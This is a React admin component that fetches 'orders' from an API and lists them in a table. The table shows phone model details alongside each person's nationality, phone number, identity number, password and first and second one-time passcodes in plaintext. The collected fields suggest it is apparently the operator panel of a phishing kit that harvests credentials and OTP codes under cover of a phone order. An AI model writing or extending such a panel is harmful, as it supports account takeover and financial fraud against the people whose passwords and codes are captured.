import React, { useEffect, useState } from 'react'

const UserDetailsTable = () => {
  const [orders, setOrders] = useState([])
  // fetch all the data from api localhost:3000/api/admin/orders
  useEffect(() => {
    fetch(`${process.env.API_URL}/api/admin/orders`)
      .then((res) => res.json())
      .then((data) => {
        setOrders(data)
      })
      .catch((err) => {
        console.log(err)
      })
  }, [])

  return (
    <div>
      <div className="relative overflow-x-auto border">
        <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
          <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 border-b">
            <tr>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                #ID
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Color
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Model
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Storage
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nationality
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Phone
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Identity
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Password
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                First OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Address
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Second OTP
              </th>
            </tr>
          </thead>
          <tbody>
            {orders.map((order, index) => (
              <tr key={index}>
                <td className="px-6 py-4">{index + 1}</td>
                <td className="px-6 py-4">{order.color}</td>
                <td className="px-6 py-4">{order.model}</td>
                <td className="px-6 py-4">{order.storage}</td>
                <td className="px-6 py-4">{order.nationality}</td>
                <td className="px-6 py-4">{order.phone}</td>
                <td className="px-6 py-4">{order.identity}</td>
                <td className="px-6 py-4">{order.password}</td>
                <td className="px-6 py-4">{order.firstOtp}</td>
                <td className="px-6 py-4">
                  {order.address.addressDetails}, {order.address.city},{' '}
                  {order.address.country}
                </td>

                <td className="px-6 py-4">{order.secondOtp}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

export default UserDetailsTable
